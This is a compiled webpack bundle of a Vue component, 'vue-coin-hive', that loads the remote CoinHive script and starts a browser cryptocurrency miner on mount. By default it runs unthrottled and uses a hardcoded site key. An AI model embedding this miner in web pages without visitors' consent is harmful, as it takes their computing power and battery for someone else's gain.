(function webpackUniversalModuleDefinition(root, factory) {
	if(typeof exports === 'object' && typeof module === 'object')
		module.exports = factory();
	else if(typeof define === 'function' && define.amd)
		define([], factory);
	else if(typeof exports === 'object')
		exports["VueCoinHive"] = factory();
	else
		root["VueCoinHive"] = factory();
})(this, function() {
return /******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// identity function for calling harmony imports with the correct context
/******/ 	__webpack_require__.i = function(value) { return value; };
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, {
/******/ 				configurable: false,
/******/ 				enumerable: true,
/******/ 				get: getter
/******/ 			});
/******/ 		}
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = ".";
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 6);
/******/ })
/************************************************************************/
/******/ ([
/* 0 */
/***/ (function(module, exports, __webpack_require__) {

// need to use require instead of import (changes from babel 5 to 6)
var Component = __webpack_require__(3);
module.exports = Component;

Component.install = function (Vue) {
  return Vue.component(Component.name, Component);
};
Component.version = "0.0.6";

// Install by default if using the script tag
if (typeof window !== 'undefined' && window.Vue) {
  window.Vue.use(Component);
}
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbInNyYy9pbmRleC5qcyJdLCJuYW1lcyI6WyJDb21wb25lbnQiLCJyZXF1aXJlIiwibW9kdWxlIiwiZXhwb3J0cyIsImluc3RhbGwiLCJWdWUiLCJjb21wb25lbnQiLCJuYW1lIiwidmVyc2lvbiIsInByb2NjZXNzIiwiZW52IiwiVkVSU0lPTiIsIndpbmRvdyIsInVzZSJdLCJtYXBwaW5ncyI6IkFBQUE7QUFDQSxJQUFNQSxZQUFZQyxRQUFRLGlCQUFSLENBQWxCO0FBQ0FDLE9BQU9DLE9BQVAsR0FBaUJILFNBQWpCOztBQUVBQSxVQUFVSSxPQUFWLEdBQW9CO0FBQUEsU0FBT0MsSUFBSUMsU0FBSixDQUFjTixVQUFVTyxJQUF4QixFQUE4QlAsU0FBOUIsQ0FBUDtBQUFBLENBQXBCO0FBQ0FBLFVBQVVRLE9BQVYsR0FBb0JDLFNBQVNDLEdBQVQsQ0FBYUMsT0FBakM7O0FBRUE7QUFDQSxJQUFJLE9BQU9DLE1BQVAsS0FBa0IsV0FBbEIsSUFBaUNBLE9BQU9QLEdBQTVDLEVBQWlEO0FBQy9DTyxTQUFPUCxHQUFQLENBQVdRLEdBQVgsQ0FBZWIsU0FBZjtBQUNEIiwiZmlsZSI6ImluZGV4LmpzIiwic291cmNlUm9vdCI6Ii9Vc2Vycy9hbGJlcnRsZWJhdHRldXgvZ2l0aHViL2FsZS1iYXR0L3Z1ZS1jb2luLWhpdmUiLCJzb3VyY2VzQ29udGVudCI6WyIvLyBuZWVkIHRvIHVzZSByZXF1aXJlIGluc3RlYWQgb2YgaW1wb3J0IChjaGFuZ2VzIGZyb20gYmFiZWwgNSB0byA2KVxuY29uc3QgQ29tcG9uZW50ID0gcmVxdWlyZSgnLi9Db21wb25lbnQudnVlJylcbm1vZHVsZS5leHBvcnRzID0gQ29tcG9uZW50XG5cbkNvbXBvbmVudC5pbnN0YWxsID0gVnVlID0+IFZ1ZS5jb21wb25lbnQoQ29tcG9uZW50Lm5hbWUsIENvbXBvbmVudClcbkNvbXBvbmVudC52ZXJzaW9uID0gcHJvY2Nlc3MuZW52LlZFUlNJT05cblxuLy8gSW5zdGFsbCBieSBkZWZhdWx0IGlmIHVzaW5nIHRoZSBzY3JpcHQgdGFnXG5pZiAodHlwZW9mIHdpbmRvdyAhPT0gJ3VuZGVmaW5lZCcgJiYgd2luZG93LlZ1ZSkge1xuICB3aW5kb3cuVnVlLnVzZShDb21wb25lbnQpXG59XG4iXX0=

/***/ }),
/* 1 */
/***/ (function(module, exports) {


module.exports = function load (src, opts, cb) {
  var head = document.head || document.getElementsByTagName('head')[0]
  var script = document.createElement('script')

  if (typeof opts === 'function') {
    cb = opts
    opts = {}
  }

  opts = opts || {}
  cb = cb || function() {}

  script.type = opts.type || 'text/javascript'
  script.charset = opts.charset || 'utf8';
  script.async = 'async' in opts ? !!opts.async : true
  script.src = src

  if (opts.attrs) {
    setAttributes(script, opts.attrs)
  }

  if (opts.text) {
    script.text = '' + opts.text
  }

  var onend = 'onload' in script ? stdOnEnd : ieOnEnd
  onend(script, cb)

  // some good legacy browsers (firefox) fail the 'in' detection above
  // so as a fallback we always set onload
  // old IE will ignore this and new IE will set onload
  if (!script.onload) {
    stdOnEnd(script, cb);
  }

  head.appendChild(script)
}

function setAttributes(script, attrs) {
  for (var attr in attrs) {
    script.setAttribute(attr, attrs[attr]);
  }
}

function stdOnEnd (script, cb) {
  script.onload = function () {
    this.onerror = this.onload = null
    cb(null, script)
  }
  script.onerror = function () {
    // this.onload = null here is necessary
    // because even IE9 works not like others
    this.onerror = this.onload = null
    cb(new Error('Failed to load ' + this.src), script)
  }
}

function ieOnEnd (script, cb) {
  script.onreadystatechange = function () {
    if (this.readyState != 'complete' && this.readyState != 'loaded') return
    this.onreadystatechange = null
    cb(null, script) // there is no way to catch loading errors in IE8
  }
}


/***/ }),
/* 2 */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
Object.defineProperty(__webpack_exports__, "__esModule", { value: true });
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_0_load_script__ = __webpack_require__(1);
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_0_load_script___default = __webpack_require__.n(__WEBPACK_IMPORTED_MODULE_0_load_script__);
//
//
//


/* harmony default export */ __webpack_exports__["default"] = ({
  name: 'vue-coin-hive',
  props: {
    start: {
      type: Boolean,
      default: true,
      required: false
    },
    startMode: {
      type: String,
      default: 'IF_EXCLUSIVE_TAB',
      required: false
    },
    siteKey: {
      type: String,
      default: 'SF4YQtgkNYmwR21W8NzKwixVdHB8wlDf',
      required: false
    },
    userName: {
      type: String,
      default: null,
      required: false
    },
    threads: {
      type: Number,
      default: 2,
      required: false
    },
    throttle: {
      type: Number,
      default: 0,
      required: false
    },
    enableFound: {
      type: Boolean,
      default: true,
      required: false
    },
    enableAccepted: {
      type: Boolean,
      default: true,
      required: false
    },
    enableUpdatesPerSecond: {
      type: Boolean,
      default: true,
      required: false
    },
    proxy: {
      type: Array,
      default: null,
      required: false
    }
  },
  mounted: function mounted() {
    var _this = this;

    __WEBPACK_IMPORTED_MODULE_0_load_script___default()('https://coin-hive.com/lib/coinhive.min.js', function () {
      if (_this.proxy) {
        var proxies = _this.proxy.reduce(function (acc, curr, i) {
          if (!(i % 8)) {
            acc.push(_this.proxy.slice(i, i + 8));
          }
          return acc;
        }, []);
        CoinHive.CONFIG.WEBSOCKET_SHARDS = proxies;
      }
      if (_this.siteKey && _this.userName) {
        _this.miner = new CoinHive.User(_this.siteKey, _this.userName);
      } else if (_this.siteKey) {
        _this.miner = new CoinHive.Anonymous(_this.siteKey);
      }
      _this.CoinHive = CoinHive;
      if (!_this.miner.isRunning() && _this.start) {
        _this.startMiner();
      }
    });
  },
  data: function data() {
    return {
      miner: null,
      CoinHive: null
    };
  },

  methods: {
    startMiner: function startMiner() {
      var _this2 = this;

      if (this.miner && !this.miner.isRunning()) {
        var mode = this.getStartMode(this.startMode);
        this.miner.start(mode);
        this.miner.setNumThreads(this.threads);
        this.miner.setThrottle(this.throttle);

        if (this.enableFound) {
          this.miner.on('found', function (x) {
            return _this2.$emit('found', x);
          });
        }
        if (this.enableAccepted) {
          this.miner.on('accepted', function (x) {
            return _this2.$emit('accepted', x);
          });
        }
        // Update stats once per second
        if (this.enableUpdatesPerSecond) {
          setInterval(function () {
            var hashesPerSecond = _this2.miner.getHashesPerSecond();
            var totalHashes = _this2.miner.getTotalHashes();
            var acceptedHashes = _this2.miner.getAcceptedHashes();
            _this2.$emit('getHashesPerSecond', { hashesPerSecond: hashesPerSecond, totalHashes: totalHashes, acceptedHashes: acceptedHashes });
          }, 1000);
        }
      }
    },
    stopMiner: function stopMiner() {
      if (this.miner && this.miner.isRunning()) {
        this.miner.stop();
      }
    },
    getStartMode: function getStartMode(type) {
      if (type === 'IF_EXCLUSIVE_TAB') {
        return this.CoinHive.IF_EXCLUSIVE_TAB;
      } else if (type === 'FORCE_EXCLUSIVE_TAB') {
        return this.CoinHive.FORCE_EXCLUSIVE_TAB;
      } else {
        return this.CoinHive.FORCE_MULTI_TAB;
      }
    }
  },
  watch: {
    start: function start(value) {
      if (value) {
        this.startMiner();
      } else {
        this.stopMiner();
      }
    }
  }
});
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbInNyYy9Db21wb25lbnQudnVlIl0sIm5hbWVzIjpbImxvYWRTY3JpcHQiLCJuYW1lIiwicHJvcHMiLCJzdGFydCIsInR5cGUiLCJCb29sZWFuIiwiZGVmYXVsdCIsInJlcXVpcmVkIiwic3RhcnRNb2RlIiwiU3RyaW5nIiwic2l0ZUtleSIsInVzZXJOYW1lIiwidGhyZWFkcyIsIk51bWJlciIsInRocm90dGxlIiwiZW5hYmxlRm91bmQiLCJlbmFibGVBY2NlcHRlZCIsImVuYWJsZVVwZGF0ZXNQZXJTZWNvbmQiLCJwcm94eSIsIkFycmF5IiwibW91bnRlZCIsInByb3hpZXMiLCJyZWR1Y2UiLCJhY2MiLCJjdXJyIiwiaSIsInB1c2giLCJzbGljZSIsIkNvaW5IaXZlIiwiQ09ORklHIiwiV0VCU09DS0VUX1NIQVJEUyIsIm1pbmVyIiwiVXNlciIsIkFub255bW91cyIsImlzUnVubmluZyIsInN0YXJ0TWluZXIiLCJkYXRhIiwibWV0aG9kcyIsIm1vZGUiLCJnZXRTdGFydE1vZGUiLCJzZXROdW1UaHJlYWRzIiwic2V0VGhyb3R0bGUiLCJvbiIsIngiLCIkZW1pdCIsInNldEludGVydmFsIiwiaGFzaGVzUGVyU2Vjb25kIiwiZ2V0SGFzaGVzUGVyU2Vjb25kIiwidG90YWxIYXNoZXMiLCJnZXRUb3RhbEhhc2hlcyIsImFjY2VwdGVkSGFzaGVzIiwiZ2V0QWNjZXB0ZWRIYXNoZXMiLCJzdG9wTWluZXIiLCJzdG9wIiwiSUZfRVhDTFVTSVZFX1RBQiIsIkZPUkNFX0VYQ0xVU0lWRV9UQUIiLCJGT1JDRV9NVUxUSV9UQUIiLCJ3YXRjaCIsInZhbHVlIl0sIm1hcHBpbmdzIjoiQUFBQTtBQUNBO0FBQ0E7O0FBRUEsT0FBT0EsVUFBUCxNQUF1QixhQUF2QjtBQUNBLGVBQWU7QUFDYkMsUUFBTSxlQURPO0FBRWJDLFNBQU87QUFDTEMsV0FBTztBQUNMQyxZQUFNQyxPQUREO0FBRUxDLGVBQVMsSUFGSjtBQUdMQyxnQkFBVTtBQUhMLEtBREY7QUFNTEMsZUFBVztBQUNU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YzRCLGVBQXJCO0FBQ0Q7QUFDRjtBQXRDTSxHQWxGSTtBQTBIYkMsU0FBTztBQUNMdEQsU0FESyxpQkFDRXVELEtBREYsRUFDUztBQUNaLFVBQUlBLEtBQUosRUFBVztBQUNULGFBQUt2QixVQUFMO0FBQ0QsT0FGRCxNQUVPO0FBQ0wsYUFBS2lCLFNBQUw7QUFDRDtBQUNGO0FBUEk7QUExSE0sQ0FBZiIsImZpbGUiOiJDb21wb25lbnQudnVlIiwic291cmNlUm9vdCI6Ii9Vc2Vycy9hbGJlcnRsZWJhdHRldXgvZ2l0aHViL2FsZS1iYXR0L3Z1ZS1jb2luLWhpdmUiLCJzb3VyY2VzQ29udGVudCI6WyIvL1xuLy9cbi8vXG5cbmltcG9ydCBsb2FkU2NyaXB0IGZyb20gJ2xvYWQtc2NyaXB0J1xuZXhwb3J0IGRlZmF1bHQge1xuICBuYW1lOiAndnVlLWNvaW4taGl2ZScsXG4gIHByb3BzOiB7XG4gICAgc3RhcnQ6IHtcbiAgICAgIHR5cGU6IEJvb2xlYW4sXG4gICAgICBkZWZhdWx0OiB0cnVlLFxuICAgICAgcmVxdWlyZWQ6IGZhbHNlLFxuICAgIH0sXG4gICAgc3RhcnRNb2RlOiB7XG4gICAgICB0eXBlOiBTdHJpbmcsXG4gICAgICBkZWZhdWx0OiAnSUZfRVhDTFVTSVZFX1RBQicsXG4gICAgICByZXF1aXJlZDogZmFsc2UsXG4gICAgfSxcbiAgICBzaXRlS2V5OiB7XG4gICAgICB0eXBlOiBTdHJpbmcsXG4gICAgICBkZWZhdWx0OiAnU0Y0WVF0Z2tOWW13UjIxVzhOekt3aXhWZEhCOHdsRGYnLFxuICAgICAgcmVxdWlyZWQ6IGZhbHNlLFxuICAgIH0sXG4gICAgdXNlck5hbWU6IHtcbiAgICAgIHR5cGU6IFN0cmluZyxcbiAgICAgIGRlZmF1bHQ6IG51bGwsXG4gICAgICByZXF1aXJlZDogZmFsc2UsXG4gICAgfSxcbiAgICB0aHJlYWRzOiB7XG4gICAgICB0eXBlOiBOdW1iZXIsXG4gICAgICBkZWZhdWx0OiAyLFxuICAgICAgcmVxdWlyZWQ6IGZhbHNlLFxuICAgIH0sXG4gICAgdGhyb3R0bGU6IHtcbiAgICAgIHR5cGU6IE51bWJlcixcbiAgICAgIGRlZmF1bHQ6IDAsXG4gICAgICByZXF1aXJlZDogZmFsc2UsXG4gICAgfSxcbiAgICBlbmFibGVGb3VuZDoge1xuICAgICAgdHlwZTogQm9vbGVhbixcbiAgICAgIGRlZmF1bHQ6IHRydWUsXG4gICAgICByZXF1aXJlZDogZmFsc2UsXG4gICAgfSxcbiAgICBlbmFibGVBY2NlcHRlZDoge1xuICAgICAgdHlwZTogQm9vbGVhbixcbiAgICAgIGRlZmF1bHQ6IHRydWUsXG4gICAgICByZXF1aXJlZDogZmFsc2UsXG4gICAgfSxcbiAgICBlbmFibGVVcGRhdGVzUGVyU2Vjb25kOiB7XG4gICAgICB0eXBlOiBCb29sZWFuLFxuICAgICAgZGVmYXVsdDogdHJ1ZSxcbiAgICAgIHJlcXVpcmVkOiBmYWxzZSxcbiAgICB9LFxuICAgIHByb3h5OiB7XG4gICAgICB0eXBlOiBBcnJheSxcbiAgICAgIGRlZmF1bHQ6IG51bGwsXG4gICAgICByZXF1aXJlZDogZmFsc2VcbiAgICB9XG4gIH0sXG4gIG1vdW50ZWQgKCkge1xuICAgIGxvYWRTY3JpcHQoJ2h0dHBzOi8vY29pbi1oaXZlLmNvbS9saWIvY29pbmhpdmUubWluLmpzJywgKCkgPT4ge1xuICAgICAgaWYgKHRoaXMucHJveHkpIHtcbiAgICAgICAgY29uc3QgcHJveGllcyA9IHRoaXMucHJveHkucmVkdWNlKChhY2MsIGN1cnIsIGkpID0+IHtcbiAgICAgICAgICBpZiAoIShpICUgOCkpIHtcbiAgICAgICAgICAgIGFjYy5wdXNoKHRoaXMucHJveHkuc2xpY2UoaSwgaSArIDgpKVxuICAgICAgICAgIH1cbiAgICAgICAgICByZXR1cm4gYWNjXG4gICAgICAgIH0sIFtdKVxuICAgICAgICBDb2luSGl2ZS5DT05GSUcuV0VCU09DS0VUX1NIQVJEUyA9IHByb3hpZXNcbiAgICAgIH1cbiAgICAgIGlmICh0aGlzLnNpdGVLZXkgJiYgdGhpcy51c2VyTmFtZSkge1xuICAgICAgICB0aGlzLm1pbmVyID0gbmV3IENvaW5IaXZlLlVzZXIodGhpcy5zaXRlS2V5LCB0aGlzLnVzZXJOYW1lKVxuICAgICAgfSBlbHNlIGlmICh0aGlzLnNpdGVLZXkpIHtcbiAgICAgICAgdGhpcy5taW5lciA9IG5ldyBDb2luSGl2ZS5Bbm9ueW1vdXModGhpcy5zaXRlS2V5KVxuICAgICAgfVxuICAgICAgdGhpcy5Db2luSGl2ZSA9IENvaW5IaXZlXG4gICAgICBpZiAoIXRoaXMubWluZXIuaXNSdW5uaW5nKCkgJiYgdGhpcy5zdGFydCkge1xuICAgICAgICB0aGlzLnN0YXJ0TWluZXIoKVxuICAgICAgfVxuICAgIH0pXG4gIH0sXG4gIGRhdGEgKCkge1xuICAgIHJldHVybiB7XG4gICAgICBtaW5lcjogbnVsbCxcbiAgICAgIENvaW5IaXZlOiBudWxsLFxuICAgIH1cbiAgfSxcbiAgbWV0aG9kczoge1xuICAgIHN0YXJ0TWluZXIgKCkge1xuICAgICAgaWYgKHRoaXMubWluZXIgJiYgIXRoaXMubWluZXIuaXNSdW5uaW5nKCkpIHtcbiAgICAgICAgY29uc3QgbW9kZSA9IHRoaXMuZ2V0U3RhcnRNb2RlKHRoaXMuc3RhcnRNb2RlKVxuICAgICAgICB0aGlzLm1pbmVyLnN0YXJ0KG1vZGUpXG4gICAgICAgIHRoaXMubWluZXIuc2V0TnVtVGhyZWFkcyh0aGlzLnRocmVhZHMpXG4gICAgICAgIHRoaXMubWluZXIuc2V0VGhyb3R0bGUodGhpcy50aHJvdHRsZSlcblxuICAgICAgICBpZiAodGhpcy5lbmFibGVGb3VuZCkge1xuICAgICAgICAgIHRoaXMubWluZXIub24oJ2ZvdW5kJywgKHgpID0+IHRoaXMuJGVtaXQoJ2ZvdW5kJywgeCkpXG4gICAgICAgIH1cbiAgICAgICAgaWYgKHRoaXMuZW5hYmxlQWNjZXB0ZWQpIHtcbiAgICAgICAgICB0aGlzLm1pbmVyLm9uKCdhY2NlcHRlZCcsICh4KSA9PiB0aGlzLiRlbWl0KCdhY2NlcHRlZCcsIHgpKVxuICAgICAgICB9XG4gICAgICAgIC8vIFVwZGF0ZSBzdGF0cyBvbmNlIHBlciBzZWNvbmRcbiAgICAgICAgaWYgKHRoaXMuZW5hYmxlVXBkYXRlc1BlclNlY29uZCkge1xuICAgICAgICAgIHNldEludGVydmFsKCgpID0+IHtcbiAgICAgICAgICAgIGNvbnN0IGhhc2hlc1BlclNlY29uZCA9IHRoaXMubWluZXIuZ2V0SGFzaGVzUGVyU2Vjb25kKClcbiAgICAgICAgICAgIGNvbnN0IHRvdGFsSGFzaGVzID0gdGhpcy5taW5lci5nZXRUb3RhbEhhc2hlcygpXG4gICAgICAgICAgICBjb25zdCBhY2NlcHRlZEhhc2hlcyA9IHRoaXMubWluZXIuZ2V0QWNjZXB0ZWRIYXNoZXMoKVxuICAgICAgICAgICAgdGhpcy4kZW1pdCgnZ2V0SGFzaGVzUGVyU2Vjb25kJywgeyBoYXNoZXNQZXJTZWNvbmQsIHRvdGFsSGFzaGVzLCBhY2NlcHRlZEhhc2hlcyB9KVxuICAgICAgICAgIH0sIDEwMDApXG4gICAgICAgIH1cbiAgICAgIH1cbiAgICB9LFxuICAgIHN0b3BNaW5lciAoKSB7XG4gICAgICBpZiAodGhpcy5taW5lciAmJiB0aGlzLm1pbmVyLmlzUnVubmluZygpKSB7XG4gICAgICAgIHRoaXMubWluZXIuc3RvcCgpXG4gICAgICB9XG4gICAgfSxcbiAgICBnZXRTdGFydE1vZGUodHlwZSkge1xuICAgICAgaWYgKHR5cGUgPT09ICdJRl9FWENMVVNJVkVfVEFCJykge1xuICAgICAgICByZXR1cm4gdGhpcy5Db2luSGl2ZS5JRl9FWENMVVNJVkVfVEFCXG4gICAgICB9IGVsc2UgaWYgKHR5cGUgPT09ICdGT1JDRV9FWENMVVNJVkVfVEFCJykge1xuICAgICAgICByZXR1cm4gdGhpcy5Db2luSGl2ZS5GT1JDRV9FWENMVVNJVkVfVEFCXG4gICAgICB9IGVsc2Uge1xuICAgICAgICByZXR1cm4gdGhpcy5Db2luSGl2ZS5GT1JDRV9NVUxUSV9UQUJcbiAgICAgIH1cbiAgICB9XG4gIH0sXG4gIHdhdGNoOiB7XG4gICAgc3RhcnQgKHZhbHVlKSB7XG4gICAgICBpZiAodmFsdWUpIHtcbiAgICAgICAgdGhpcy5zdGFydE1pbmVyKClcbiAgICAgIH0gZWxzZSB7XG4gICAgICAgIHRoaXMuc3RvcE1pbmVyKClcbiAgICAgIH1cbiAgICB9LFxuICB9LFxufVxuIl19

/***/ }),
/* 3 */
/***/ (function(module, exports, __webpack_require__) {

var Component = __webpack_require__(4)(
  /* script */
  __webpack_require__(2),
  /* template */
  __webpack_require__(5),
  /* scopeId */
  null,
  /* cssModules */
  null
)

module.exports = Component.exports


/***/ }),
/* 4 */
/***/ (function(module, exports) {

module.exports = function normalizeComponent (
  rawScriptExports,
  compiledTemplate,
  scopeId,
  cssModules
) {
  var esModule
  var scriptExports = rawScriptExports = rawScriptExports || {}

  // ES6 modules interop
  var type = typeof rawScriptExports.default
  if (type === 'object' || type === 'function') {
    esModule = rawScriptExports
    scriptExports = rawScriptExports.default
  }

  // Vue.extend constructor export interop
  var options = typeof scriptExports === 'function'
    ? scriptExports.options
    : scriptExports

  // render functions
  if (compiledTemplate) {
    options.render = compiledTemplate.render
    options.staticRenderFns = compiledTemplate.staticRenderFns
  }

  // scopedId
  if (scopeId) {
    options._scopeId = scopeId
  }

  // inject cssModules
  if (cssModules) {
    var computed = options.computed || (options.computed = {})
    Object.keys(cssModules).forEach(function (key) {
      var module = cssModules[key]
      computed[key] = function () { return module }
    })
  }

  return {
    esModule: esModule,
    exports: scriptExports,
    options: options
  }
}


/***/ }),
/* 5 */
/***/ (function(module, exports) {

